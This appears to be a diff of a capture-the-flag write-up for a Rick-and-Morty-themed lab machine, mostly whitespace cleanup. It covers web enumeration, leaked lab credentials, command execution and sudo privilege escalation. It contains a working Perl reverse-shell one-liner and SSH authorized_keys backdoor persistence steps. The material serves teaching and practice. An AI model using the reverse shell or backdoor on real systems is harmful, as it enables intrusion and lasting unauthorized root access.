@@ -8,21 +8,19 @@ description: LAST UPDATED 23-MAY-2025
 
 ## Manual Inspection
 
-When I visited the webpage I was greeted with  a note that relates to the theme of the CTF. However, there seem to be nothing interesting or relevant to the technical details of the machine.
+When I visited the webpage I was greeted with a note that relates to the theme of the CTF. However, there seem to be nothing interesting or relevant to the technical details of the machine.
 
 Next, I used the Chrome developer tools to inspect the source code, and I found the following comment:
 
-`Note to self, rememberusername!`&#x20;
+`Note to self, rememberusername!`
 
 `Username: R1ckRul3s`
 
 This tells me that there exists a username `R1ckRul3s`.
 
-
-
 ## Directory Enumeration
 
-The wordlists used in this section are present in the root directory: `/usr/share/wordlists/SecLists/Discovery/Web-Content`&#x20;
+The wordlists used in this section are present in the root directory: `/usr/share/wordlists/SecLists/Discovery/Web-Content`
 
 {% embed url="https://github.com/danielmiessler/SecLists" %}
 
@@ -34,15 +32,13 @@ _**(1) Basic discovery**_
 gobuster dir -u ... -w .../common.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 From the results, it appears that the `/robots.txt` path exists. Upon visiting, it returns:
 
-`Wubbalubbadubdub`&#x20;
+`Wubbalubbadubdub`
 
 Seems like a strange text, could it be another username, a clue, or perhaps a password? We will leave it here for now.
-
-
 
 _**(2) Fingerprinting the web server**_
 
@@ -61,8 +57,6 @@ $ whatweb <target_url>
 
 We have found out that the web server uses _**Apache.**_
 
-
-
 _**(3) Enumerating PHP**_
 
 PHP is commonly used as the underlying programming language on an Apache web server. Thus, I decided to enumerate common PHP filenames and directories. Note that the commands listed below are similar to the ones used in the first part above, just with addition of flags, and change of wordlist.
@@ -77,8 +71,6 @@ $ gobuster dir -u http://<target> -x php -w .../common.txt
 
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 2. _Common-PHP-Filenames.txt_
 
 ```bash
@@ -87,9 +79,9 @@ $ gobuster dir -u http://<target> -w .../Common-PHP-Filenames.txt
 
 <figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-It appears that we have found a few `.php` files such as `login.php`, `portal.php` and `denied.php`.&#x20;
+It appears that we have found a few `.php` files such as `login.php`, `portal.php` and `denied.php`.
 
-_**The****&#x20;****`ffuf`****&#x20;****tool can be used to enumerate the directories too:**_
+_**The\*\*\*\*****&#x20;****`ffuf`****&#x20;****\*\*\*\*tool can be used to enumerate the directories too:**_
 
 ```bash
 # 1)
@@ -105,17 +97,15 @@ Next, I visited the path `/login.php` , and was presented with a login page. I u
 
 **Enumerating the webpage**
 
-&#x20;After logging in, the webpage was redirected to`/portal.php` .
+After logging in, the webpage was redirected to`/portal.php` .
 
 The following comment was found in the source code:
 
 `Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`
 
-This is a string that has been base64-encoded multiple times. The plaintext value turns out to be `rabbit hole` . Well, is this a clue,  perhaps a directory path value, name of a file, or simply something just to throw us off?
+This is a string that has been base64-encoded multiple times. The plaintext value turns out to be `rabbit hole` . Well, is this a clue, perhaps a directory path value, name of a file, or simply something just to throw us off?
 
 The main interface presented an input form that accepts commands for a Linux environment. This form will be used to enumerate the Linux system and find the ingredients.
-
-
 
 ## First Ingredient
 
@@ -125,8 +115,6 @@ $ more Sup3rS3cretPickl3Ingred.txt # does not work
 $ less Sup3rS3cretPickl3Ingred.txt # WORKS!
 mr. meeseek hair
 ```
-
-
 
 ## Second Ingredient
 
@@ -141,8 +129,6 @@ $ less '/home/rick/second ingredients' # 'more' and 'cat' disabled
 1 jerry tear
 ```
 
-
-
 ## Third Ingredient
 
 I was having difficulty finding the third ingredient from the file system, as most of my attempts at enumerating the directories returned an empty response. Thus, I decided to further enumerate the webpage.
@@ -151,7 +137,7 @@ Upon visiting `/denied.php` ,
 
 We are presented with a message: "_Only the REAL rick can view this page._" This made me wonder, by _REAL rick_, does this mean we have to somehow access this page via the root account?
 
-### Privilege Escalation&#x20;
+### Privilege Escalation
 
 **(1) SQL Injection attempt**
 
@@ -182,13 +168,11 @@ User www-data may run the following commands on ip-10-10-49-150:
     
 ```
 
-The output  `(ALL) NOPASSWD: ALL`  tells us that the current user is allowed to run `sudo` without any password. This means that we are able to gain an unauthenticated superuser privilege.
-
-
+The output `(ALL) NOPASSWD: ALL` tells us that the current user is allowed to run `sudo` without any password. This means that we are able to gain an unauthenticated superuser privilege.
 
 **Finding the last and final ingredient**
 
-After further enumeration on the file system, I found out that the 3rd ingredient is in the `/root` directory.&#x20;
+After further enumeration on the file system, I found out that the 3rd ingredient is in the `/root` directory.
 
 ```bash
 $ sudo ls -la /root
@@ -226,7 +210,7 @@ _**1.2 Perl (works)**_
 $ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-**(2) Persistence**&#x20;
+**(2) Persistence**
 
 Now that we have a session with superuser privileges (`sudo`), we can load our SSH public key to the `.ssh/authorized_keys` file. Specifically, the key will be added to the file under the home directory for the root user: `/root`, allowing us to gain persistence as the root user.
 
@@ -234,7 +218,7 @@ Now that we have a session with superuser privileges (`sudo`), we can load our S
 
 _**From the attacker machine**_
 
-_**2.1 Generate a SSH keypair**_&#x20;
+_**2.1 Generate a SSH keypair**_
 
 ```bash
 $ ssh-keygen -f ssh-user-key
@@ -263,4 +247,3 @@ root@host:~#
 Assuming that the admin does not clean up the `.ssh/authorized_keys` file, we can access our backdoor with a root shell anytime as needed.
 
 > NOTE: Yes, ofcourse I removed the backdoor access after I was done testing.
-
